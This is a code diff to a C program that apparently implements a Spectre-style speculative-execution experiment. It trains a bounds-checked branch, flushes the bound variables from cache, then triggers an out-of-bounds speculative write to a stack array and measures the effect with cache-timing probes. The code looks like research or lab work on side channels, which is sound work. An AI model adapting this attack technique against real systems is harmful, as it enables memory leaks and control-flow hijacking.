@@ -103,8 +103,8 @@ uint64_t __attribute__((section(".max_len"))) min_len = 0;
 uint64_t __attribute__((section(".max_len"))) max_len = 43;
 
 
-void branch(register uint64_t entry, register uint64_t index){
-    uint64_t overflow[43];
+void branch(register uint64_t* overflow, register uint64_t entry, register uint64_t index){
+    // uint64_t overflow[43];
     if ((index < max_len) && (index >= min_len)) {
         //asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
         //target_fn();
@@ -116,19 +116,21 @@ void branch(register uint64_t entry, register uint64_t index){
 void trick_branch(){
     int i=0;
     int training_rounds = 2000;
-    //uint64_t overflow[43];
+    uint64_t overflow[43];
+    void (*fn_ptr)(void) = check_probes;
     uint64_t good_val = 0xDEADBEEF12345678;
     uint64_t bad_val  = 0x0000000000434040;
 
-    // memset(overflow, 0x44, sizeof(overflow));
+    memset(overflow, 0x44, sizeof(overflow));
     for (i=0; i< training_rounds; i++){
-        branch(good_val, i%43);
+        branch(overflow, good_val, i%43);
     }
     _mm_clflush(&max_len);
     _mm_clflush(&min_len);
     flush_probe_buf_i();
 
-    branch(bad_val, 44);
+    branch(overflow, bad_val, 50);
+    fn_ptr();
 }
 
 void measure() {
@@ -150,8 +152,7 @@ void measure() {
             trick_branch();
             //target_fn();
             //asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
-            check_probes();
-            usleep(10);
+            // check_probes();
         }
 
         uint64_t avg = 0;
@@ -182,7 +183,6 @@ void measure() {
 }
 
 
-
 int main()
 {
     probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
@@ -197,6 +197,10 @@ int main()
         memset(&probe_buf[i*MAX_PROBE_SPACE], i, MAX_PROBE_SPACE);
         _mm_clflush(&probe_buf[i*cur_probe_space]);
     }
+
+    void * map; 
+    map = malloc(1024);
+    memcpy(map, target_fn, end_target_fn-target_fn);
 
     measure();
 
